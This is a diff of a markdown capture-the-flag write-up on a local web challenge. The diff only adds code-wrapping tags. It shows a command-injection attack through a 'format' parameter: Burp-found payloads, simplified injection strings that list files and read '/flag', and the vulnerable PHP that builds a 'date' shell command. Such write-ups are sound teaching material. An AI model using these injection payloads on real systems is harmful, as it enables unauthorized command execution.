@@ -38,37 +38,48 @@ Opting for the lazy route, I check the burp scanner and find some interesting re
 
 Here's the URL-decoded [PoC](http://127.0.0.1:1337/?format=%25H%3a%25M%3a%25S%7cecho%20kefbjki4ag%20d6tyxfigki%7c%7ca%20%23'%20%7cecho%20kefbjki4ag%20d6tyxfigki%7c%7ca%20%23%7c%22%20%7cecho%20kefbjki4ag%20d6tyxfigki%7c%7ca%20%23) from burp:
 
+{% code overflow="wrap" %}
 ```
 /?format=%H:%M:%S|echo kefbjki4ag d6tyxfigki||a #' |echo kefbjki4ag d6tyxfigki||a #|" |echo kefbjki4ag d6tyxfigki||a #
 ```
+{% endcode %}
 
 The result indicates that the `echo kefbjki4ag d6tyxfigki` command did indeed execute.
 
+{% code overflow="wrap" %}
 ```html
 </span> kefbjki4ag d6tyxfigki<span class='text-muted'>.</span>
 ```
+{% endcode %}
 
 The payload syntax/length is a little confusing so I keep removing elements and re-testing to ensure the command still executes. The attack can be simplified to:
 
+{% code overflow="wrap" %}
 ```
 /?format=%H:%M:%S' |ls #
 ```
+{% endcode %}
 
 If we [URL-encode it](http://127.0.0.1:1337/?format=%25H%3a%25M%3a%25S'+|ls+%23) it lists the `views` directory. If we look around for a while we might not see the flag. Let's just check the source code and see the Dockerfile has the following line.
 
+{% code overflow="wrap" %}
 ```dockerfile
 # Copy flag
 COPY flag /flag
 ```
+{% endcode %}
 
 Therefore, we can print the flag with [this payload](http://127.0.0.1:1337/?format=%25H%3a%25M%3a%25S'+|cat+/flag+%23) to retrieve the flag.
 
+{% code overflow="wrap" %}
 ```
 /?format=%H:%M:%S' |cat /flag #
 ```
+{% endcode %}
 
 We've already solved the challenge but why not review the vulnerable source code. Notice `TimeController.php` processes our vulnerable GET parameter (`format`).
 
+{% code overflow="wrap" %}
 ```php
 <?php
 class TimeController
@@ -81,9 +92,11 @@ class TimeController
     }
 }
 ```
+{% endcode %}
 
 It passes our user input (🚫) to the `TimeModel.php` constructor which then executes the command.
 
+{% code overflow="wrap" %}
 ```php
 <?php
 class TimeModel
@@ -101,12 +114,15 @@ class TimeModel
     }
 }
 ```
+{% endcode %}
 
 So, assuming we submit `format=%H:%M:%S' |cat /flag #`, the `command` property of the object will be:
 
+{% code overflow="wrap" %}
 ```bash
 date '%H:%M:%S'' |cat /flag # 2>&1
 ```
+{% endcode %}
 
 Due to us closing off the string and inserting a pipe character, we were able to inject a malicious command! Crucially, we also needed to add a hash character afterwards, to prevent the output from being redirected.
 
